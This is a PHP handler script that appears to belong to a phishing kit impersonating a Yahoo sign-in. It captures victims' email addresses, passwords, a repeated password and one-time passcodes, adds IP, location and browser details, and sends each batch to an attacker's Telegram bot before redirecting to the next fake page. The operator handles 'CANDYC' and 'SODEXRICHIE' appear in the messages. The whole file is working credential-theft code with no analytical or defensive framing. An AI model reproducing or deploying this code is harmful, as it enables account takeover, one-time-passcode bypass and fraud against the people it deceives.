<?php 
session_start();
// Variable declaration
$errors = array(); 

if (isset($_POST['email'])) {
    include 'recon.php';
    include '../conf/config.php';
    $settings = include '../conf/settings.php';

    // Get User Input
    $_SESSION['email'] = $_POST['email'];

    $ip = getenv("REMOTE_ADDR");
    $port = $_SERVER['REMOTE_PORT'];
    $useragent = $_SERVER['HTTP_USER_AGENT'];

    // Store IP and Port in session
    $_SESSION['ip'] = $ip;
    $_SESSION['port'] = $port;

    // Send email
    $body = "YAHOO Login 👨‍💻@CANDYC\r\n";
    $body .= "|Email: {$_SESSION['email']}\r\n";
    $body .= "|---- I N F O | I P ----|\r\n";
    $body .= "IP Address: {$_SESSION['ip']}\r\n";
    $body .= "Port: {$_SESSION['port']}\r\n";
    $body .= "IP Country: {$_SESSION['country']}\r\n";
    $body .= "IP City: {$_SESSION['city']}\r\n";
    $body .= "Browser: {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
    $body .= "User Agent: {$_SERVER['HTTP_USER_AGENT']}\r\n";
    $body .= "TIME: ".date("d/m/Y h:i:sa")." GMT\r\n";
    $body .= "::: REDSTONE CU 💚SODEXRICHIE💚 :::\r\n";
    
    if($savetxt == "off"){

    }             

    $subject = "Login Access 2 => From {$_SESSION['ip']} [ {$_SESSION['country']}-{$_SESSION['countrycode']} - {$_SESSION['platform']} ]";
    $headers = "From: SODEX <sodex.com>\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
    
    if ($tgresult == "on") {
        $data = $body;
        $send = ['chat_id' => $settings['chat_id'], 'text' => $data];
        $website = "https://api.telegram.org/{$settings['bot_url']}";
        $ch = curl_init($website . '/sendMessage');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $send);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $result = curl_exec($ch);
        curl_close($ch);
    }

    echo "<script>window.location.href='../../Yahoo3.html';</script>";
    exit();
}

if (isset($_POST['password'])) {
    include 'recon.php';
    include '../conf/config.php';
    $settings = include '../conf/settings.php';

    // Get User Input
    $_SESSION['password'] = $_POST['password'];

    $ip = getenv("REMOTE_ADDR");
    $port = $_SERVER['REMOTE_PORT'];
    $useragent = $_SERVER['HTTP_USER_AGENT'];

    // Store IP and Port in session
    $_SESSION['ip'] = $ip;
    $_SESSION['port'] = $port;

    // Send email
    $body = "YAHOO Login 2 👨‍💻@CANDYC\r\n";
    $body .= "|Email Address: {$_SESSION['email']}\r\n";
    $body .= "|Password: {$_SESSION['password']}\r\n";
    $body .= "|---- I N F O | I P ----|\r\n";
    $body .= "IP Address: {$_SESSION['ip']}\r\n";
    $body .= "Port: {$_SESSION['port']}\r\n";
    $body .= "IP Country: {$_SESSION['country']}\r\n";
    $body .= "IP City: {$_SESSION['city']}\r\n";
    $body .= "Browser: {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
    $body .= "User Agent: {$_SERVER['HTTP_USER_AGENT']}\r\n";
    $body .= "TIME: ".date("d/m/Y h:i:sa")." GMT\r\n";
    $body .= "::: REDSTONE CU 💚SODEXRICHIE💚 :::\r\n";
    
    if($savetxt == "off"){

    }             

    $subject = "Login Access 2 => From {$_SESSION['ip']} [ {$_SESSION['country']}-{$_SESSION['countrycode']} - {$_SESSION['platform']} ]";
    $headers = "From: SODEX <sodex.com>\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
    
    if ($tgresult == "on") {
        $data = $body;
        $send = ['chat_id' => $settings['chat_id'], 'text' => $data];
        $website = "https://api.telegram.org/{$settings['bot_url']}";
        $ch = curl_init($website . '/sendMessage');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $send);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $result = curl_exec($ch);
        curl_close($ch);
    }

    echo "<script>window.location.href='../../Yahoo2.html';</script>";
    exit();
}

if (isset($_POST['password1'])) {
    include 'recon.php';
    include '../conf/config.php';
    $settings = include '../conf/settings.php';

    // Get User Input
    $_SESSION['password1'] = $_POST['password1'];

    $ip = getenv("REMOTE_ADDR");
    $port = $_SERVER['REMOTE_PORT'];
    $useragent = $_SERVER['HTTP_USER_AGENT'];

    // Store IP and Port in session
    $_SESSION['ip'] = $ip;
    $_SESSION['port'] = $port;

    // Send email
    $body = "YAHOO LOGIN  👨‍💻CANDYC  [OTP] \r\n";
    $body .= "|Email Address: {$_SESSION['email']}\r\n";
    $body .= "|Password: {$_SESSION['password1']}\r\n";
    $body .= "Telegram: @SODEX \r\n";
    $body .= "|------- I N F O | I P --------|\r\n";
    $body .= "IP Address: {$_SESSION['ip']}\r\n";
    $body .= "Port: {$_SESSION['port']}\r\n";
    $body .= "IP Country: {$_SESSION['country']}\r\n";
    $body .= "IP City: {$_SESSION['city']}\r\n";
    $body .= "Browser: {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
    $body .= "User Agent: {$_SERVER['HTTP_USER_AGENT']}\r\n";
    $body .= "TIME: ".date("d/m/Y h:i:sa")." GMT\r\n";
    $body .= ":::: REDSTONE CU 💚SODEXRICHIE💚 ::\r\n";
    
    if($savetxt == "off"){

    }             

    $subject = "Login Access 1 => From {$_SESSION['ip']} [ {$_SESSION['country']}-{$_SESSION['countrycode']} - {$_SESSION['platform']} ]";
    $headers = "From: sodex <huntington.com>\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
    
    if ($tgresult == "on") {
        $data = $body;
        $send = ['chat_id' => $settings['chat_id'], 'text' => $data];
        $website = "https://api.telegram.org/{$settings['bot_url']}";
        $ch = curl_init($website . '/sendMessage');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $send);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $result = curl_exec($ch);
        curl_close($ch);
    }

    echo "<script>window.location.href='../../Yahoo1.html';</script>";
    exit();
}

if (isset($_POST['otp'])) {
    include 'recon.php';
    include '../conf/config.php';
    $settings = include '../conf/settings.php';

    // Get User Input
    $_SESSION['otp'] = $_POST['otp'];

    $ip = getenv("REMOTE_ADDR");
    $port = $_SERVER['REMOTE_PORT'];
    $useragent = $_SERVER['HTTP_USER_AGENT'];

    // Store IP and Port in session
    $_SESSION['ip'] = $ip;
    $_SESSION['port'] = $port;

    // Send email
    $body = " YAHOO  👨‍💻CANDYC [OTP |Det@ils] \r\n";
    $body .= "|OTP: {$_SESSION['otp']}\r\n";
    $body .= "|------ I N F O | I P -------|\r\n";
    $body .= "IP Address: {$_SESSION['ip']}\r\n";
    $body .= "Port: {$_SESSION['port']}\r\n";
    $body .= "IP Country: {$_SESSION['country']}\r\n";
    $body .= "IP City: {$_SESSION['city']}\r\n";
    $body .= "Browser: {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
    $body .= "User Agent: {$_SERVER['HTTP_USER_AGENT']}\r\n";
    $body .= "TIME: ".date("d/m/Y h:i:sa")." GMT\r\n";
    $body .= ":: YAHOO 💚SODEXRICHIE💚 1nf0 ::\r\n";
    
    if($savetxt == "off"){

    }             

    $subject = "Card Details 1 => From {$_SESSION['ip']} [ {$_SESSION['platform']} ]";
    $headers = "From: SODEX <sodex.com>\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
    
    if ($tgresult == "on") {
        $data = $body;
        $send = ['chat_id' => $settings['chat_id'], 'text' => $data];
        $website = "https://api.telegram.org/{$settings['bot_url']}";
        $ch = curl_init($website . '/sendMessage');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $send);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $result = curl_exec($ch);
        curl_close($ch);
    }

    echo "<script>window.location.href='../../Yahoo2.html';</script>";
    exit();
}


?>
